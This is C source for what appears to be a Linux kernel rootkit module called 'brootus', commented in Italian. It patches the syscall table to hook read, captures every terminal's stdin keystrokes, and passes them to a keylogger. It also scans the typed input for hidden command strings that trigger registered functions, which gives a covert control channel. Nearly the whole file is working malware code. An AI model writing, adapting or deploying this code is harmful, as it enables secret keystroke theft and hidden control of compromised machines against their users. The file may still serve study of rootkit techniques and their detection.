#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fdtable.h>
#include <linux/sched.h>
#include <linux/dcache.h>
#include <linux/fs.h>
#include <asm/uaccess.h>

#include "load_magic.h"
#include "syscall.h"
#include "keylogger.h"
#include "vt_channel.h"

struct command commands[CMD_LENGTH];
int commands_len = 0;

// VT buffers
struct vt_buffer* buffers;
spinlock_t buffers_lock;

extern spinlock_t buffers_lock;

// salvtaggio sys call lette
asmlinkage long (*original_read)(unsigned int fd, char __user *buf, size_t count);

// aggiunta nuovo comando
void add_command(char* name, void (*f)(char*))
{
  // clonazione nome
  int len = strlen(name);
  char* name_copy = kmalloc(len + 1, GFP_KERNEL);
  strcpy(name_copy, name);

  commands[commands_len].name = name_copy;
  commands[commands_len].f = f;

  commands_len++;
}

// imposta nome per il vt buffer
void set_vt_name(struct vt_buffer* buffer, const char* vt_name, int vt_name_length)
{
  buffer->vt = kmalloc(vt_name_length + 1, GFP_KERNEL);
  memcpy(buffer->vt, vt_name, vt_name_length);
  buffer->vt[vt_name_length] = '\0';
}

// trova il vt buffer con il nome, se non è presente si crea
struct vt_buffer* find_vt_buffer(const char* vt_name, int vt_name_length)
{
  struct vt_buffer* cur;
  spin_lock(&buffers_lock);
  list_for_each_entry(cur, &buffers->list, list) {
    if (strcmp(vt_name, cur->vt) == 0) {
      spin_unlock(&buffers_lock);
      return cur;
    }
  }
  // non trovato -> crea una nuova entry
  cur = kmalloc(sizeof(struct vt_buffer), GFP_KERNEL);
  cur->buffer_pos = 0;
  set_vt_name(cur, vt_name, vt_name_length);
  list_add(&cur->list, &buffers->list);
  spin_unlock(&buffers_lock);

  return cur;
}

// inizializza una lista vt buffer
void init_vt_buffers(void)
{
  buffers_lock = SPIN_LOCK_UNLOCKED;
  buffers = kmalloc(sizeof(struct vt_buffer), GFP_KERNEL);
  INIT_LIST_HEAD(&buffers->list);
}

void handle_backspaces(struct vt_buffer* vtbuf)
{
  char* c;
  char* end = vtbuf->buffer + vtbuf->buffer_pos;

  for (c = vtbuf->buffer + 1; c != end; c++) {
    if (*c == 0x7f && c != vtbuf->buffer) { // We hit a backspace
      // calcola la lunghezza del resto del buffer
      int len = end - (c + 1);

      memmove(c - 1, c + 1, len);

      // modificla la posizione delle variabili
      vtbuf->buffer_pos -= 2;
      end -= 2;
      c -= 2;
    }
  }
}

const char* stdin_file_name(void)
{
  const char* name;
  char* result = NULL;
  struct files_struct* files;
  struct fdtable* fdt;
  struct file* fd_stdin;
  struct dentry* dentry_stdin;
  struct inode* inode_stdin;

  rcu_read_lock();
  files = rcu_dereference(current->files);

  spin_lock(&files->file_lock);
  fdt = files_fdtable(files);

  fd_stdin = rcu_dereference(fdt->fd[0]);
  if (fd_stdin == NULL) {
    goto exit;
  }

  dentry_stdin = rcu_dereference(fd_stdin->f_dentry);
  if (dentry_stdin == NULL) {
    goto exit;
  }

  inode_stdin = rcu_dereference(dentry_stdin->d_inode);
  if (inode_stdin == NULL) {
    goto exit;
  }

  if (!S_ISCHR(dentry_stdin->d_inode->i_mode)) {
    goto exit;
  }

  name = rcu_dereference(dentry_stdin->d_name).name;
  result = kmalloc(strlen(name), GFP_KERNEL);
  strcpy(result, name);

  exit:
  rcu_read_unlock();
  spin_unlock(&files->file_lock);
  return result;
}

// esegue i comandi del vt buffer
int handle_commands(struct vt_buffer* vtbuf)
{
  int result = 0;
  char* pos;
  int i;

  handle_backspaces(vtbuf);

  // si rende il buffer una stringa c per usare str
  vtbuf->buffer[vtbuf->buffer_pos] = '\0';

  for (i = 0; i < commands_len; i++) {
    struct command* cmd = &commands[i];
    int name_len = strlen(cmd->name);

    // cerca il comando
    pos = strstr(vtbuf->buffer, cmd->name);

    if (pos != NULL && *(pos+name_len) == '(') {
      char* arg_begin = pos + name_len + 1;
      char* arg_end = strstr(arg_begin, ")");

      if (arg_end != NULL) {
        // estrae l'argomento
        char* argument = kmalloc(arg_end - arg_begin + 1, GFP_KERNEL);
        char* ap = argument;
        char* c = arg_begin;
        for (; c != arg_end; ap++, c++) {
          *ap = *c;
        }
        *ap = '\0';

        // richiama la funzione
        cmd->f((char*) argument);
        kfree(argument);

        // pulisce il buffer
        vtbuf->buffer_pos = 0;

        result++;
      }
    }
  }
  return result;
}

long read_stdin(unsigned int fd, char __user *buf, size_t count, long ret)
{
  const char* vt_name;
  int vt_name_length;
  struct vt_buffer* vtbuf;

  long num_read = ret; // Bytes read by the original call
  int err;
  int user_buffer_pos = 0;

  // ottiene il nome del vt corrente
  vt_name = stdin_file_name();

  if (vt_name == NULL) {
    return ret;
  }

  // trova o crea il vt corrispondente
  vt_name_length = strlen(vt_name);
  vtbuf = find_vt_buffer(vt_name, vt_name_length);
  kfree(vt_name);

  while (num_read > 0) {
    // max(num_read, BUFFER_LENGTH)
    int read_len = num_read;
    if (num_read > VT_BUFFER_LENGTH) {
      read_len = VT_BUFFER_LENGTH;
    }

    // copia il contenuto del buffer dal kernel space allo user space
    err = copy_from_user(vtbuf->buffer + vtbuf->buffer_pos, buf + user_buffer_pos, read_len);
    if (err) {
        return ret;
    }

    log_keys(vtbuf->vt, vtbuf->buffer + vtbuf->buffer_pos, read_len);

    num_read -= read_len;
    user_buffer_pos += read_len;
    vtbuf->buffer_pos += read_len;

    handle_commands(vtbuf);
  }

  return ret;
}

// ciò che è stato hookato per il vt channel
asmlinkage long brootus_read(unsigned int fd, char __user *buf, size_t count)
{
  // chiam funzione originale
  long ret = original_read(fd, buf, count);

  // controlla se il modulo è stato deallocato nel frattempo
  if (!check_load_magic()) {
    return ret;
  }

  // ritorna immediatamente se non trova alcun dato
  if (ret <= 0) {
    return ret;
  }

  // per lel ettura in stdin
  if (fd == 0) {
    ret = read_stdin(fd, buf, count, ret);
  }

  return ret;
}

void free_vt_buffers(void)
{
  struct vt_buffer* cur;
  struct list_head* next;

  spin_lock(&buffers_lock);
  next = buffers->list.next;

  while (next != &buffers->list) {
    //ottiene il vt buffer
    cur = container_of(next, struct vt_buffer, list);

    //salva i lprossimo puntatore
    next = cur->list.next;

    kfree(cur->vt);
    kfree(cur);
  }

  kfree(buffers);
  spin_unlock(&buffers_lock);
}

void free_commands(void)
{
  int i;
  for (i = 0; i < commands_len; i++) {
    kfree(commands[i].name);
  }
  commands_len = 0;
}

void init_vt_channel(void)
{
  init_vt_buffers();

  // hooka il syscall
  syscall_table_modify_begin();
  HOOK_SYSCALL(read);
  syscall_table_modify_end();
}

void finalize_vt_channel(void)
{
  // rispristina la tabella della syscall
  syscall_table_modify_begin();
  RESTORE_SYSCALL(read);
  syscall_table_modify_end();

  free_vt_buffers();
  free_commands();
}